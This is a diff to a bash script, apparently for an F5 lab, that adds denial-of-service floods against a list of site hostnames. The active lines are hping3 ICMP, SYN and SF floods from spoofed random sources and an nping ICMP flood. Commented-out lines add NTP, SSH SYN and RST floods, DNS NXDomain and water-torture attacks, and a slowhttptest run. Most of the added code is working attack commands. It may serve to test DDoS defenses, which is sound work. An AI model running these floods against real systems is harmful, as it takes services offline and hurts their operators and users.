@@ -3,7 +3,6 @@
 # set -x
 
 home="/home/f5/scripts"
-cmip="10.1.10.4"
 
 already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
 if [  $already -gt 2 ]; then
@@ -92,12 +91,49 @@ do
             #ps -ef | grep hping3 | grep -v grep
             #ps -ef | grep "sleep rand" | grep -v grep
 
-            cd $home/DDosAttacks
-            ./gen_data.sh ${sitefqdn[$i]} &
+            #echo "Running HPing3 attack script towards FTP... \r\n"
+            #sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ${sitefqdn[$i]} 2> /dev/null &
+
+            echo "Running ping flood attack from random sources \r\n"
+            sudo hping3 ${sitefqdn[$i]} --icmp --flood --rand-source 2> /dev/null &
+
+            #--- HTTP attacks ---
+            echo "Running HPing3 flood attack to HTTP \r\n "
+            sudo hping3 ${sitefqdn[$i]} -p $port –SF --flood 2> /dev/null &
+
+            echo "Running syn flood attack from random sources, towards a webserver \r\n "
+            sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 ${sitefqdn[$i]} 2> /dev/null &
+
+            #echo "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
+            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &
+
+            #echo "Performing a TCP SYN Flood towards SSH \r\n"
+            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &
+
+            RATE=5000
+            SAMPLES=1000000000
+            OUTPUT=&>/dev/null
+            NPING_SILENT='-HNq'
+            echo "Performing a ICMP Flood \r\n "
+            sudo nping ${sitefqdn[$i]} $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &
+
+            #echo "Performing a RST Flood on TCP towards SSH \r\n "
+            #sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
+
+            #------ Attack traffic ----------
+            #echo "Running NX Domain attack python script... \r\n "
+            #sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
+            #echo "Running DNS Water Torture attack against server"
+            #sudo ./attack_dns_watertorture_wget.sh $server_ip  &>/dev/null &
+
+            #--- web attacks -----
+            #echo "Performing a Slow HTTP Test script against webserver \r\n "
+            #sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &
+            #sudo ./gen_ab.sh $server_ip &>/dev/null &
             
             r=`shuf -i 120-600 -n 1`;
-            perl -le "sleep rand $r" && ./kill_all_attacks.sh
-
+            perl -le "sleep rand $r" && killall -9 hping3
+            perl -le "sleep rand $r" && killall -9 nping
 
         else
                 echo "SKIP ${sitefqdn[$i]} - $ip not answering on port 443 or 80"
